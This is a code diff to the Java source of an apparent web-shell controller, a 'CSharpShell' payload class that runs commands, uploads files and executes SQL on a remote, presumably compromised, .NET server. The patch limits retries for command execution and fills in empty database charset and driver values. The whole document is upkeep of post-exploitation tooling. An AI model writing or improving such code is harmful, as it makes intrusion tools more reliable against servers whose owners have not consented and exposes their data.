@@ -140,7 +140,7 @@ public class CSharpShell extends AbstractPayload {
             byte[] data = parameter.formatEx();
             data = functions.gzipE(data);
             byte[] result = null;
-            int maxErrRetryTmp = this.maxErrRetry == 0 ? 1 : (this.maxErrRetry > 0 ? this.maxErrRetry : 1);
+            int maxErrRetryTmp = this.retryCountFor(funcName);
 
             for(int i = 0; i < maxErrRetryTmp; ++i) {
                 try {
@@ -162,6 +162,16 @@ public class CSharpShell extends AbstractPayload {
             parameter.remove("sessionId");
             return result;
         }
+    }
+
+    private int retryCountFor(String funcName) {
+        if (funcName != null) {
+            String name = funcName.trim();
+            if ("execCommand".equalsIgnoreCase(name)) {
+                return 1;
+            }
+        }
+        return this.maxErrRetry == 0 ? 1 : (this.maxErrRetry > 0 ? this.maxErrRetry : 1);
     }
 
     public boolean uploadFile(String fileName, byte[] data) {
@@ -430,6 +440,9 @@ public class CSharpShell extends AbstractPayload {
     }
 
     public GDatabaseResult execSql(DbInfo dbInfo, String execType, String execSql) {
+        if (dbInfo.getDatabaseCharset() == null || dbInfo.getDatabaseCharset().trim().isEmpty()) {
+            dbInfo.setDatabaseCharset("UTF-8");
+        }
         Encoding dbEncoding = dbInfo.getDatabaseCharset2();
         String connectString = dbInfo.getConnectionString();
         if (connectString.isEmpty()) {
@@ -440,9 +453,20 @@ public class CSharpShell extends AbstractPayload {
         parameter.add("dbType", dbInfo.getDatabaseType());
         parameter.add("dbUsername", dbInfo.getUsername());
         parameter.add("dbPassword", dbInfo.getPassword());
-        parameter.add("dbCharset", dbInfo.getDatabaseCharset2().getCharsetString());
+        String charset = dbEncoding.getCharsetString();
+        if (charset == null || charset.trim().isEmpty()) {
+            charset = "UTF-8";
+        }
+        parameter.add("dbCharset", charset);
         parameter.add("connectString", dbEncoding.Encoding(connectString));
-        parameter.add("dbDriver", dbInfo.getDatabaseDrive());
+        String drive = dbInfo.getDatabaseDrive();
+        if (drive == null || drive.trim().isEmpty()) {
+            String[] drives = this.getDatabaseDrives(dbInfo.getDatabaseType());
+            if (drives != null && drives.length > 0) {
+                drive = drives[0];
+            }
+        }
+        parameter.add("dbDriver", drive == null ? "" : drive);
         parameter.add("execType", execType);
         parameter.add("execSql", dbEncoding.Encoding(execSql));
         String sqlPreview = execSql == null ? "" : (execSql.length() > 1200 ? execSql.substring(0, 1200) + "\n..." : execSql);
